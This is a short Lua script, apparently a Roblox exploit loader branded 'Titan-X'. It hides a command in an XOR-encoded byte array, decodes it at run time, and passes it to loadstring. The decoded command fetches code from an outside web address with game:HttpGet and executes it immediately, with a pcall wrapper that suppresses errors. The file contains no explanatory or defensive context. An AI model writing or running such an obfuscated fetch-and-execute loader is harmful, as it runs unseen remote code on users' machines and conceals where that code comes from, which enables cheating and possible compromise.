local _7a7z8b6aihb = {96,99,109,104,127,120,126,101,98,107,36,107,109,97,105,54,68,120,120,124,75,105,120,36,46,100,120,120,124,127,54,35,35,98,101,118,105,126,33,121,101,34,99,98,105,109,124,124,34,104,105,122,35,46,37,37,36,37}
local _xq4gzsrvese = 12

local function _274qryajgj0(d, k)
    local _gqs8dvlrjqw = bit32 and bit32.bxor or function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            if a % 2 ~= b % 2 then r = r + m end
            a, b, m = math.floor(a / 2), math.floor(b / 2), m * 2
        end
        return r
    end
    
    local _7kjqr46ftom = ""
    for i = 1, #d do
        _7kjqr46ftom = _7kjqr46ftom .. string.char(_gqs8dvlrjqw(d[i], k))
    end
    return _7kjqr46ftom
end

local _exec = loadstring or load
local _success, _err = pcall(function()
    _exec(_274qryajgj0(_7a7z8b6aihb, _xq4gzsrvese))()
end)

if not _success then 
    warn("[Titan-X Error]: Script failed to initialize. Details: " .. tostring(_err))
end
